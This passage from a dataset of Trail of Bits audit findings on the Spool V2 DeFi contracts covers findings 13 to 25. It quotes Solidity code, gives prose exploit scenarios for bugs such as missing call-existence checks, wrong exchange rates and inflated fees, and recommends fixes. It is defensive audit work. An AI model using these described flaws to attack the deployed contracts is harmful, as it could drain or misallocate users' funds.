on low-level calls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The GuardManager and Swapper contracts use low-level calls without contract existence checks. If the target address is incorrect or the contract at that address is destroyed, a low-level call will still return success. The Swapper.swap function uses the address().call(...) function to swap tokens (gure 13.1). function swap ( address [] calldata tokensIn, SwapInfo[] calldata swapInfo, address [] calldata tokensOut, address receiver ) external returns ( uint256 [] memory tokenAmounts) { // Perform the swaps. for ( uint256 i ; i < swapInfo.length; ++i) { if (!exchangeAllowlist[swapInfo[i].swapTarget]) { revert ExchangeNotAllowed(swapInfo[i].swapTarget); } _approveMax(IERC20(swapInfo[i].token), swapInfo[i].swapTarget); ( bool success , bytes memory data) = swapInfo[i].swapTarget.call(swapInfo[i].swapCallData); if (!success) revert (SpoolUtils.getRevertMsg(data)); } // Return unswapped tokens. for ( uint256 i ; i < tokensIn.length; ++i) { uint256 tokenInBalance = IERC20(tokensIn[i]).balanceOf( address ( this )); if (tokenInBalance > 0 ) { IERC20(tokensIn[i]).safeTransfer(receiver, tokenInBalance); } } Figure 13.1: The swap function in spool-v2-core/Swapper.sol#L29L45 The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their rst return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 13.2: The Solidity documentation details the necessity of executing existence checks before performing low-level calls. Therefore, if the swapTarget address is incorrect or the target contract has been destroyed, the execution will not revert even if the swap is not successful. We rated this nding as only a low-severity issue because the Swapper contract transfers the unswapped tokens to the receiver if a swap is not successful. However, the CompoundV2Strategy contract uses the Swapper contract to exchange COMP tokens for underlying tokens (gure 13.3). function _compound( address [] calldata tokens, SwapInfo[] calldata swapInfo, uint256 [] calldata ) internal override returns ( int256 compoundedYieldPercentage) { if (swapInfo.length > 0) { address [] memory markets = new address [](1); markets[0] = address (cToken); comptroller.claimComp( address ( this ), markets); uint256 compBalance = comp.balanceOf(address(this)); if (compBalance > 0) { comp.safeTransfer(address(swapper), compBalance); address [] memory tokensIn = new address [](1); tokensIn[0] = address(comp); uint256 swappedAmount = swapper.swap(tokensIn, swapInfo, tokens, address(this))[0]; if ( swappedAmount > 0) { uint256 cTokenBalanceBefore = cToken.balanceOf( address ( this )); _depositToCompoundProtocol (IERC20(tokens[0]), swappedAmount); uint256 cTokenAmountCompounded = cToken.balanceOf( address ( this )) - cTokenBalanceBefore; _calculateYieldPercentage(cTokenBalanceBefore, cTokenAmountCompounded); compoundedYieldPercentage = } } } } Figure 13.3: The _compound function in spool-v2-core/CompoundV2Strategy.sol If the swap operation fails, the COMP will stay in CompoundV2Strategy . This will cause users to lose the yield they would have gotten from compounding. Because the swap operation fails silently, the do hard worker may not notice that yield is not compounding. As a result, users will receive less in prot than they otherwise would have. The GuardManager.runGuards function, which uses the address().staticcall() function, is also aected by this issue. However, the return value of the call is decoded, so the calls would not fail silently. Exploit Scenario The Spool team deploys CompoundV2Strategy with a market that gives COMP tokens to its users. While executing the doHardWork function for smart vaults using CompoundV2Strategy , the do hard worker sets the swapTarget address to an incorrect address. The swap operation to exchange COMP to the underlying token fails silently. The gained yield is not deposited into the market. The users receive less in prot. Recommendations Short term, implement a contract existence check before the low-level calls in GuardManager.runGuards and Swapper.swap . Long term, avoid implementing low-level calls. If such calls are unavoidable, carefully review the Solidity documentation , particularly the Warnings section, before implementing them to ensure that they are implemented correctly.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "14. Incorrect use of exchangeRates in doHardWork ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The StrategyRegistry contracts doHardWork function fetches the exchangeRates for all of the tokens involved in the do hard work process, and then it iterates over the strategies and saves the exchangeRates values for the current strategys tokens in the assetGroupExchangeRates variable; however, when doHardWork is called for a strategy, the exchangeRates variable rather than the assetGroupExchangeRates variable is passed, resulting in the use of incorrect exchange rates. function doHardWork(DoHardWorkParameterBag calldata dhwParams) external whenNotPaused { ... // Get exchange rates for tokens and validate them against slippages. uint256 [] memory exchangeRates = SpoolUtils.getExchangeRates(dhwParams.tokens, _priceFeedManager); for ( uint256 i; i < dhwParams.tokens.length; ++i) { if ( exchangeRates[i] < dhwParams.exchangeRateSlippages[i][0] || exchangeRates[i] > dhwParams.exchangeRateSlippages[i][1] revert ExchangeRateOutOfSlippages(); ) { } } ... // Get exchange rates for this group of strategies. uint256 assetGroupId = IStrategy(dhwParams.strategies[i][0]).assetGroupId(); address [] memory assetGroup = IStrategy(dhwParams.strategies[i][0]).assets(); uint256 [] memory assetGroupExchangeRates = new uint256 [](assetGroup.length); for (uint256 j; j < assetGroup.length; ++j) { bool found = false ; for ( uint256 k; k < dhwParams.tokens.length; ++k) { if (assetGroup[j] == dhwParams.tokens[k]) { assetGroupExchangeRates[j] = exchangeRates[k]; found = true ; break ; } } ... // Do the hard work on the strategy. DhwInfo memory dhwInfo = IStrategy(strategy).doHardWork( StrategyDhwParameterBag({ swapInfo: dhwParams.swapInfo[i][j], compoundSwapInfo: dhwParams.compoundSwapInfo[i][j], slippages: dhwParams.strategySlippages[i][j], assetGroup: assetGroup, exchangeRates: exchangeRates , withdrawnShares: _sharesRedeemed[strategy][dhwIndex], masterWallet: address(_masterWallet), priceFeedManager: _priceFeedManager, baseYield: dhwParams.baseYields[i][j], platformFees: platformFeesMemory }) ); // Bookkeeping. _dhwAssetRatios[strategy] = IStrategy(strategy).assetRatio(); _exchangeRates[strategy][dhwIndex].setValues( exchangeRates ); ... Figure 14.1: A snippet of the doHardWork function in spool-v2-core/StrategyRegistry.sol#L222L 341 The exchangeRates values are used by a strategys doHardWork function to calculate how many assets in USD value are to be deposited and how many in USD value are currently deposited in the strategy. As a consequence of using exchangeRates rather than assetGroupExchangeRates , the contract will return incorrect values. Additionally, the _exchangeRates variable is returned by the strategyAtIndexBatch function, which is used when simulating deposits. Exploit Scenario Bob deploys a smart vault, and users start depositing into it. However, the rst time doHardWork is called, they notice that the deposited assets and the reported USD value deposited into the strategies are incorrect. They panic and start withdrawing all of the funds. Recommendations Short term, replace exchangeRates with assetGroupExchangeRates in the relevant areas of doHardWork and where it sets the _exchangeRates variable. Long term, improve the systems unit and integration tests to verify that the deposited value in a strategy is the expected amount. Additionally, when reviewing the code, look for local variables that are set but then never used; this is a warning sign that problems may arise.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "15. LinearAllocationProvider could return an incorrect result ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The LinearAllocationProvider contract returns an incorrect result when the given smart vault has a riskTolerance value of -8 due to an incorrect literal value in the riskArray variable. function calculateAllocation(AllocationCalculationInput calldata data) external pure returns ( uint256 [] memory ) { ... uint24 [21] memory riskArray = [ 100000, 95000, 900000 , ... ]; ... uint8 riskt = uint8 (data.riskTolerance + 10); // from 0 to 20 for ( uint8 i; i < data.apys.length; ++i) { ... results[i] = apy * riskArray[ uint8 (20 - riskt)] + risk * riskArray[ uint8 (riskt)] ; resSum += results[i]; } uint256 resSum2; for ( uint8 i; i < results.length; ++i) { results[i] = FULL_PERCENT * results[i] / resSum; resSum2 += results[i]; } results[0] += FULL_PERCENT - resSum2; return results; Figure 15.1: A snippet of the calculateAllocation function in spool-v2-core/LinearAllocationProvider.sol#L9L67 The riskArray s third element is incorrect; this aects the computed allocation for smart vaults that have a riskTolerance value of -8 because the riskt variable would be 2 , which is later used as index for the riskArray . The subexpression risk * riskArray[uint8(rikst)] is incorrect by a factor of 10. Exploit Scenario Bob deploys a smart vault with a riskTolerance value of -8 and an empty strategyAllocation value. The allocation between the strategies is computed on the spot using the LinearAllocationProvider contract, but the allocation is wrong. Recommendations Short term, replace 900000 with 90000 in the calculateAllocation function. Long term, improve the systems unit and integration tests to catch issues such as this. Document the use and meaning of constants such as the values in riskArray . This will make it more likely that the Spool team will nd these types of mistakes.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "16. Incorrect formula used for adding/subtracting two yields ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The doHardWork function adds two yields with dierent base values to compute the given strategys total yield, which results in the collection of fewer ecosystem fees and treasury fees. It is incorrect to add two yields that have dierent base values. The correct formula to compute the total yield from two consecutive yields Y1 and Y2 is Y1 + Y2 + (Y1*Y2) . The doHardWork function in the Strategy contract adds the protocol yield and the rewards yield to calculate the given strategys total yield. The protocol yield percentage is calculated with the base value of the strategys total assets at the start of the current do hard work cycle, while the rewards yield percentage is calculated with the base value of the total assets currently owned by the strategy. dhwInfo.yieldPercentage = _getYieldPercentage(dhwParams.baseYield); dhwInfo.yieldPercentage += _compound(dhwParams.assetGroup, dhwParams.compoundSwapInfo, dhwParams.slippages); Figure 16.1: A snippet of the doHardWork function in spool-v2-core/Strategy.sol#L95L96 Therefore, the total yield of the strategy is computed as less than its actual yield, and the use of this value to compute fees results in the collection of fewer fees for the platforms governance system. Same issue also aects the computation of the total yield of a strategy on every do hard work cycle: _stateAtDhw[strategy][dhwIndex] = StateAtDhwIndex({ sharesMinted: uint128 (dhwInfo.sharesMinted), totalStrategyValue: uint128 (dhwInfo.valueAtDhw), totalSSTs: uint128 (dhwInfo.totalSstsAtDhw), yield: int96 (dhwInfo.yieldPercentage) + _stateAtDhw[strategy][dhwIndex - 1].yield, // accumulate the yield from before timestamp: uint32 (block.timestamp) }); Figure 16.2: A snippet of the doHardWork function in spool-v2-core/StrategyRegistry.sol#L331L337 This value of the total yield of a strategy is used to calculate the management fees for a given smart vault, which results in fewer fees paid to the smart vault owner. Exploit Scenario The Spool team deploys the system. Alice deposits 1,000 tokens into a vault, which mints 1,000 strategy share tokens for the vault. On the next do hard work execution, the tokens earn 8% yield and 30 reward tokens from the protocol. The 30 reward tokens are then exchanged for 20 deposit tokens. At this point, the total tokens earned by the strategy are 100 and the total yield is 10%. However, the doHardWork function computes the total yield as 9.85%, which is incorrect, resulting in fewer fees collected for the platform. Recommendations Short term, use the correct formula to calculate a given strategys total yield in both the Strategy contract and the StrategyRegistry contract. Note that the syncDepositsSimulate function subtracts a strategys total yield at dierent do hard work indexes in DepositManager.sol#L322L326 to compute the dierence between the strategys yields between two do hard work cycles. After xing this issue, this functions computation will be incorrect. Long term, review the entire codebase to nd all of the mathematical formulas used. Document these formulas, their assumptions, and their derivations to avoid the use of incorrect formulas.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "17. Smart vaults with re-registered strategies will not be usable ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The StrategyRegistry contract does not clear the state related to a strategy when removing it. As a result, if the removed strategy is registered again, the StrategyRegistry contract will still contain the strategys previous state, resulting in a temporary DoS of the smart vaults using it. The StrategyRegistry.registerStrategy function is used to register a strategy and to initialize the state related to it (gure 17.1). StrategyRegistry tracks the state of the strategies by using their address. function registerStrategy ( address strategy ) external { _checkRole(ROLE_SPOOL_ADMIN, msg.sender ); if (_accessControl.hasRole(ROLE_STRATEGY, strategy)) revert StrategyAlreadyRegistered({address_: strategy}); _accessControl.grantRole(ROLE_STRATEGY, strategy); _currentIndexes[strategy] = 1 ; _dhwAssetRatios[strategy] = IStrategy(strategy).assetRatio(); _stateAtDhw[ address (strategy)][ 0 ].timestamp = uint32 ( block.timestamp ); } Figure 17.1: The registerStrategy function in spool-v2-core/StrategyRegistry.sol The StrategyRegistry._removeStrategy function is used to remove a strategy by revoking its ROLE_STRATEGY role. function _removeStrategy ( address strategy ) private { if (!_accessControl.hasRole(ROLE_STRATEGY, strategy)) revert InvalidStrategy({address_: strategy}); _accessControl.revokeRole(ROLE_STRATEGY, strategy); } Figure 17.2: The _removeStrategy function in spool-v2-core/StrategyRegistry.sol While removing a strategy, StrategyRegistry contract does not remove the state related to that strategy. As a result, when that strategy is registered again, StrategyRegistry will contain values from the previous period. This could make the smart vaults using the strategy unusable or cause the unintended transfer of assets between other strategies and this strategy. Exploit Scenario Strategy S is registered. StrategyRegistry._currentIndex[S] is equal to 1 . Alice creates a smart vault X that uses strategy S. Bob deposits 1 million WETH into smart vault X. StrategyRegistry._assetsDeposited[S][1][WETH] is equal to 1 million WETH. The doHardWork function is called for strategy S. WETH is transferred from the master wallet to strategy S and is deposited into the protocol. A Spool system admin removes strategy S upon hearing that the protocol is being exploited. However, the admin realizes that the protocol is not being exploited and re-registers strategy S. StrategyRegistry._currentIndex[S] is set to 1 . StrategyRegistry._assetsDeposited[S][1][WETH] is not set to zero and is still equal to 1 million WETH. Alice creates a new vault with strategy S. When doHardWork is called for strategy S, StrategyRegistry tries to transfer 1 million WETH to the strategy. The master wallet does not have those assets, so doHardWork fails for strategy S. The smart vault becomes unusable. Recommendations Short term, modify the StrategyRegistry._removeStrategy function so that it clears states related to removed strategies if re-registering strategies is an intended use case. If this is not an intended use case, modify the StrategyRegistry.registerStrategy function so that it veries that newly registered strategies have not been previously registered. Long term, properly document all intended use cases of the system and implement comprehensive tests to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "18. Incorrect handling of partially burned NFTs results in incorrect SVT balance calculation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The SmartVault._afterTokenTransfer function removes the given NFT ID from the SmartVault._activeUserNFTIds array even if only a fraction of it is burned. As a result, the SmartVaultManager.getUserSVTBalance function, which uses SmartVault._activeUserNFTIds , will show less than the given users actual balance. SmartVault._afterTokenTransfer is executed after every token transfer (gure 18.1). function _afterTokenTransfer ( address , address from , address to , uint256 [] memory ids, uint256 [] memory , bytes memory ) internal override { // burn if (to == address ( 0 )) { uint256 count = _activeUserNFTCount[from]; for ( uint256 i ; i < ids.length; ++i) { for ( uint256 j = 0 ; j < count; j++) { if (_activeUserNFTIds[from][j] == ids[i]) { _activeUserNFTIds[from][j] = _activeUserNFTIds[from][count - 1 ]; count--; break ; } } } _activeUserNFTCount[from] = count; return ; } [...] } Figure 18.1: A snippet of the _afterTokenTransfer function in spool-v2-core/SmartVault.sol It removes the burned NFT from _activeUserNFTIds . However, it does not consider the amount of the NFT that was burned. As a result, NFTs that are not completely burned will not be considered active by the vault. SmartVaultManager.getUserSVTBalance uses SmartVault._activeUserNFTIds to calculate a given users SVT balance (gure 18.2). function getUserSVTBalance ( address smartVaultAddress , address userAddress ) external view returns ( uint256 ) { if (_accessControl.smartVaultOwner(smartVaultAddress) == userAddress) { (, uint256 ownerSVTs ,, uint256 fees ) = _simulateSync(smartVaultAddress); return ownerSVTs + fees; } uint256 currentBalance = ISmartVault(smartVaultAddress).balanceOf(userAddress); uint256 [] memory nftIds = ISmartVault(smartVaultAddress).activeUserNFTIds(userAddress); if (nftIds.length > 0 ) { currentBalance += _simulateNFTBurn(smartVaultAddress, userAddress, nftIds); } return currentBalance; } Figure 18.2: The getUserSVTBalance function in spool-v2-core/SmartVaultManager.sol Because partial NFTs are not present in SmartVault._activeUserNFTIds , the calculated balance will be less than the users actual balance. The front end using getUserSVTBalance will show incorrect balances to users. Exploit Scenario Alice deposits assets into a smart vault and receives a D-NFT. Alice's assets are deposited to the protocols after doHardWork is called. Alice claims SVTs by burning a fraction of her D-NFT. The smart vault removes the D-NFT from _activeUserNFTIds . Alice checks her SVT balance and panics when she sees less than what she expected. She withdraws all of her assets from the system. Recommendations Short term, add a check to the _afterTokenTransfer function so that it checks the balance of the NFT that is burned and removes the NFT from _activeUserNFTIds only when the NFT is burned completely. Long term, improve the systems unit and integration tests to extensively test view functions.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "19. Transfers of D-NFTs result in double counting of SVT balance ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The _activeUserNFTIds and _activeUserNFTCount variables are not updated for the sender account on the transfer of NFTs. As a result, SVTs for transferred NFTs will be counted twice, causing the system to show an incorrect SVT balance. The _afterTokenTransfer hook in the SmartVault contract is executed after every token transfer to update information about users active NFTs: function _afterTokenTransfer ( address , address from , address to , uint256 [] memory ids, uint256 [] memory , bytes memory ) internal override { // burn if (to == address ( 0 )) { ... return ; } // mint or transfer for ( uint256 i; i < ids.length; ++i) { _activeUserNFTIds[to][_activeUserNFTCount[to]] = ids[i]; _activeUserNFTCount[to]++; } } Figure 19.1: A snippet of the _afterTokenTransfer function in spool-v2-core/SmartVault.sol When a user transfers an NFT to another user, the function adds the NFT ID to the active NFT IDs of the receivers account but does not remove the ID from the active NFT IDs of the senders account. Additionally, the active NFT count is not updated for the senders account. The getUserSVTBalance function of the SmartVaultManager contract uses the SmartVault contracts _activeUserNFTIds array to calculate a given users SVT balance: function getUserSVTBalance ( address smartVaultAddress , address userAddress ) external view returns ( uint256 ) { if (_accessControl.smartVaultOwner(smartVaultAddress) == userAddress) { (, uint256 ownerSVTs ,, uint256 fees ) = _simulateSync(smartVaultAddress); return ownerSVTs + fees; } uint256 currentBalance = ISmartVault(smartVaultAddress).balanceOf(userAddress); uint256 [] memory nftIds = ISmartVault(smartVaultAddress).activeUserNFTIds(userAddress); if (nftIds.length > 0 ) { currentBalance += _simulateNFTBurn(smartVaultAddress, userAddress, nftIds); } return currentBalance; } Figure 19.2: The getUserSVTBalance function in spool-v2-core/SmartVaultManager.sol Because transferred NFT IDs are active for both senders and receivers, the SVTs corresponding to the NFT IDs will be counted for both users. This double counting will keep increasing the SVT balance for users with every transfer, causing an incorrect balance to be shown to users and third-party integrators. Exploit Scenario Alice deposits assets into a smart vault and receives a D-NFT. Alice's assets are deposited into the protocols after doHardWork is called. Alice transfers the D-NFT to herself. The SmartVault contract adds the D-NFT ID to _activeUserNFTIds for Alice again. Alice checks her SVT balance and sees double the balance she had before. Recommendations Short term, modify the _afterTokenTransfer function so that it removes NFT IDs from the active NFT IDs for the senders account when users transfer D-NFTs and W-NFTs. Long term, add unit test cases for all possible user interactions to catch issues such as this.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "20. Flawed loop for syncing ushes results in higher management fees ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The loop used to sync ush indexes in the SmartVaultManager contract computes an inated value of the oldTotalSVTs variable, which results in higher management fees paid to the smart vault owner. The _syncSmartVault function in the SmartVaultManager contract implements a loop to process every ush index from flushIndex.toSync to flushIndex.current : while (flushIndex.toSync < flushIndex.current) { ... DepositSyncResult memory syncResult = _depositManager.syncDeposits( smartVault, [flushIndex.toSync, bag.lastDhwSynced, bag.oldTotalSVTs], strategies_, [indexes, _getPreviousDhwIndexes(smartVault, flushIndex.toSync)], tokens, bag.fees ); bag.newSVTs += syncResult.mintedSVTs; bag.feeSVTs += syncResult.feeSVTs; bag.oldTotalSVTs += bag.newSVTs; bag.lastDhwSynced = syncResult.dhwTimestamp; emit SmartVaultSynced(smartVault, flushIndex.toSync); flushIndex.toSync++; } Figure 20.1: A snippet of the _syncSmartVault function in spool-v2-core/SmartVaultManager.sol This loop adds the value of mintedSVTs to the newSVTs variables and then computes the value of oldTotalSVTs by adding newSVTs to it in every iteration. Because mintedSVTs are added in every iteration, new minted SVTs are added for each ush index multiple times when the loop is iterated more than once. The value of oldTotalSVTs is then passed to the syncDeposit function of the DepositManager contract, which uses it to compute the management fee for the smart vault. The use of the inated value of oldTotalSVTs causes higher management fees to be paid to the smart vault owner. Exploit Scenario Alice deposits assets into a smart vault and ushes it. Before doHardWork is executed, Bob deposits assets into the same smart vault and ushes it. At this point, flushIndex.current has been increased twice for the smart vault. After the execution of doHardWork , the loop to sync the smart vault is iterated twice. As a result, a double management fee is paid to the smart vault owner, and Alice and Bob lose assets. Recommendations Short term, modify the loop so that syncResult.mintedSVTs is added to bag.oldTotalSVTs instead of bag.newSVTs . Long term, be careful when implementing accumulators in loops. Add test cases for multiple interactions to catch such issues.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "21. Incorrect ghost strategy check ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The emergencyWithdraw and redeemStrategyShares functions incorrectly check whether a strategy is a ghost strategy after checking that the strategy has a ROLE_STRATEGY role. function emergencyWithdraw( address [] calldata strategies, uint256 [][] calldata withdrawalSlippages, bool removeStrategies ) external onlyRole(ROLE_EMERGENCY_WITHDRAWAL_EXECUTOR, msg.sender ) { for ( uint256 i; i < strategies.length; ++i) { _checkRole(ROLE_STRATEGY, strategies[i]); if (strategies[i] == _ghostStrategy) { continue ; } [...] Figure 21.1: A snippet the emergencyWithdraw function spool-v2-core/StrategyRegistry.sol#L456L465 function redeemStrategyShares( address [] calldata strategies, uint256 [] calldata shares, uint256 [][] calldata withdrawalSlippages ) external { for ( uint256 i; i < strategies.length; ++i) { _checkRole(ROLE_STRATEGY, strategies[i]); if (strategies[i] == _ghostStrategy) { continue ; } [...] Figure 21.2: A snippet the emergencyWithdraw function spool-v2-core/StrategyRegistry.sol#L477L486 A ghost strategy will never have the ROLE_STRATEGY role, so both functions will always incorrectly revert if a ghost strategy is passed in the strategies array. Exploit Scenario Bob calls redeemStrategyShares with the ghost strategy in strategies and the transaction unexpectedly reverts. Recommendations Short term, modify the aected functions so that they verify whether the given strategy is a ghost strategy before checking the role with _checkRole . Long term, clearly document which roles a contract should have and implement the appropriate checks to verify them.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "22. Reward conguration not initialized properly when reward is zero ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The RewardManager.addToken function, which adds a new reward token for the given smart vault, does not initialize all conguration variables when the initial reward is zero. As a result, all calls to the RewardManager.extendRewardEmission function will fail, and rewards cannot be added for that vault. RewardManager.addToken adds a new reward token for the given smart vault. The reward tokens for a smart vault are tracked using the RewardManager.rewardConfiguration function. The tokenAdded value of the conguration is used to check whether the token has already been added for the vault (gure 22.1). function addToken ( address smartVault , IERC20 token, uint32 rewardsDuration , uint256 reward ) external onlyAdminOrVaultAdmin(smartVault, msg.sender ) exceptUnderlying(smartVault, token) { RewardConfiguration storage config = rewardConfiguration [smartVault][token]; if (tokenBlacklist[smartVault][token]) revert RewardTokenBlacklisted( address (token)); if ( config.tokenAdded != 0 ) revert RewardTokenAlreadyAdded( address (token)); if (rewardsDuration == 0 ) revert InvalidRewardDuration(); if (rewardTokensCount[smartVault] > 5 ) revert RewardTokenCapReached(); rewardTokens[smartVault][rewardTokensCount[smartVault]] = token; rewardTokensCount[smartVault]++; config.rewardsDuration = rewardsDuration; if ( reward > 0 ) { _extendRewardEmission(smartVault, token, reward); } } Figure 22.1: The addToken function in spool-v2-core/RewardManager.sol#L81L101 However, RewardManager.addToken does not update config.tokenAdded , and the _extendRewardEmission function, which updates config.tokenAdded , is called only when the reward is greater than zero. RewardManager.extendRewardEmission is the only entry point to add rewards for a vault. It checks whether token has been previously added by verifying that tokenAdded is greater than zero (gure 22.2). function extendRewardEmission ( address smartVault , IERC20 token, uint256 reward , uint32 rewardsDuration ) external onlyAdminOrVaultAdmin(smartVault, msg.sender ) exceptUnderlying(smartVault, token) { if (tokenBlacklist[smartVault][token]) revert RewardTokenBlacklisted( address (token)); if (rewardsDuration == 0 ) revert InvalidRewardDuration(); if ( rewardConfiguration[smartVault][token].tokenAdded == 0 ) { revert InvalidRewardToken( address (token)); } [...] } Figure 22.2: The extendRewardEmission function in spool-v2-core/RewardManager.sol#L106L119 Because tokenAdded is not initialized when the initial rewards are zero, the vault admin cannot add the rewards for the vault in that token. The impact of this issue is lower because the vault admin can use the RewardManager.removeReward function to remove the token and add it again with a nonzero initial reward. Note that the vault admin can only remove the token without blacklisting it because the config.periodFinish value is also not initialized when the initial reward is zero. Exploit Scenario Alice is the admin of a smart vault. She adds a reward token for her smart vault with the initial reward set to zero. Alice tries to add rewards using extendRewardEmission , and the transaction fails. She cannot add rewards for her smart vault. She has to remove the token and re-add it with a nonzero initial reward. Recommendations Short term, use a separate Boolean variable to track whether a token has been added for a smart vault, and have RewardManager.addToken initialize that variable. Long term, improve the systems unit tests to cover all execution paths.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "23. Missing function for removing reward tokens from the blacklist ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "A Spool admin can blacklist a reward token for a smart vault through the RewardManager contract, but they cannot remove it from the blacklist. As a result, a reward token cannot be used again once it is blacklisted. The RewardManager.forceRemoveReward function blacklists the given reward token by updating the RewardManager.tokenBlacklist array (gure 23.1). Blacklisted tokens cannot be used as rewards. function forceRemoveReward ( address smartVault , IERC20 token) external onlyRole(ROLE_SPOOL_ADMIN, msg.sender ) { tokenBlacklist[smartVault][token] = true ; _removeReward(smartVault, token); delete rewardConfiguration[smartVault][token]; } Figure 23.1: The forceRemoveReward function in spool-v2-core/RewardManager.sol#L160L165 However, RewardManager does not have a function to remove tokens from the blacklist. As a result, if the Spool admin accidentally blacklists a token, then the smart vault admin will never be able to use that token to send rewards. Exploit Scenario Alice is the admin of a smart vault. She adds WETH and token A as rewards. The value of token A declines rapidly, so a Spool admin decides to blacklist the token for Alices vault. The Spool admin accidentally supplies the WETH address in the call to forceRemoveReward . As a result, WETH is blacklisted, and Alice cannot send rewards in WETH. Recommendations Short term, add a function with the proper access controls to remove tokens from the blacklist. Long term, improve the systems unit tests to cover all execution paths.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "24. Risk of unclaimed shares due to loss of precision in reallocation operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The ReallocationLib.calculateReallocation function releases strategy shares and calculates their USD value. The USD value is later converted into strategy shares in the ReallocationLib.doReallocation function. Because the conversion operations always round down, the number of shares calculated in doReallocation will be less than the shares released in calculateReallocation . As a result, some shares released in calculateReallocation will be unclaimed, as ReallocationLib distributes only the shares computed in doReallocation . ReallocationLib.calculateAllocation calculates the USD value that needs to be withdrawn from each of the strategies used by smart vaults (gure 24.1). The smart vaults release the shares equivalent to the calculated USD value. /** * @dev Calculates reallocation needed per smart vault. [...] * @return Reallocation of the smart vault: * - first index is 0 or 1 * - 0: * - second index runs over smart vault's strategies * - value is USD value that needs to be withdrawn from the strategy [...] */ function calculateReallocation ( [...] ) private returns ( uint256 [][] memory ) { [...] } else if (targetValue < currentValue) { // This strategy needs withdrawal. [...] IStrategy(smartVaultStrategies[i]). releaseShares (smartVault, sharesToRedeem ); // Recalculate value to withdraw based on released shares. reallocation[ 0 ][i] = IStrategy(smartVaultStrategies[i]).totalUsdValue() * sharesToRedeem / IStrategy(smartVaultStrategies[i]).totalSupply(); } } return reallocation ; } Figure 24.1: The calculateReallocation function in spool-v2-core/ReallocationLib.sol#L161L207 The ReallocationLib.buildReallocationTable function calculates the reallocationTable value. The reallocationTable[i][j][0] value represents the USD amount that should move from strategy i to strategy j (gure 24.2). These USD amounts are calculated using the USD values of the released shares computed in ReallocationLib.calculateReallocation (represented by reallocation[0][i] in gure 24.1). /** [...] * @return Reallocation table: * - first index runs over all strategies i * - second index runs over all strategies j * - third index is 0, 1 or 2 * - 0: value represent USD value that should be withdrawn by strategy i and deposited into strategy j */ function buildReallocationTable ( [...] ) private pure returns ( uint256 [][][] memory ) { Figure 24.2: A snippet of buildReallocationTable function in spool-v2-core/ReallocationLib.sol#L209L228 ReallocationLib.doReallocation calculates the total USD amount that should be withdrawn from a strategy (gure 24.3). This total USD amount is exactly equal to the sum of the USD values needed to be withdrawn from the strategy for each of the smart vaults. The doReallocation function converts the total USD value to the equivalent number of strategy shares. The ReallocationLib library withdraws this exact number of shares from the strategy and distributes them to other strategies that require deposits of these shares. function doReallocation ( [...] uint256 [][][] memory reallocationTable ) private { // Distribute matched shares and withdraw unamatched ones. for ( uint256 i ; i < strategies.length; ++i) { [...] { uint256 [ 2 ] memory totals; // totals[0] -> total withdrawals for ( uint256 j ; j < strategies.length; ++j) { totals[ 0 ] += reallocationTable[i][j][ 0 ] ; [...] } // Calculate amount of shares to redeem and to distribute. uint256 sharesToDistribute = // first store here total amount of shares that should have been withdrawn IStrategy(strategies[i]).totalSupply() * totals[ 0 ] / IStrategy(strategies[i]).totalUsdValue(); [...] } [...] Figure 24.3: A snippet of the doReallocation function in spool-v2-core/ReallocationLib.sol#L285L350 Theoretically, the shares calculated for a strategy should be equal to the shares released by all of the smart vaults for that strategy. However, there is a loss of precision in both the calculateReallocation functions calculation of the USD value of released shares and the doReallocation functions conversion of the combined USD value to strategy shares. As a result, the number of shares released by all of the smart vaults will be less than the shares calculated in calculateReallocation . Because the ReallocationLib library only distributes these calculated shares, there will be some unclaimed strategy shares as dust. It is important to note that the rounding error could be greater than one in the context of multiple smart vaults. Additionally, the error could be even greater if the conversion results were rounded in the opposite direction: in that case, if the calculated shares were greater than the released shares, the reallocation would fail when burn and claim operations are executed. Recommendations Short term, modify the code so that it stores the number of shares released in calculateReallocation , and implement dustless calculations to build the reallocationTable value with the share amounts and the USD amounts. Have doReallocation use this reallocationTable value to calculate the value of sharesToDistribute . Long term, use Echidna to test system and mathematical invariants.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "25. Curve3CoinPoolAdapters _addLiquidity reverts due to incorrect amounts deposited ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The _addLiquidity function loops through the 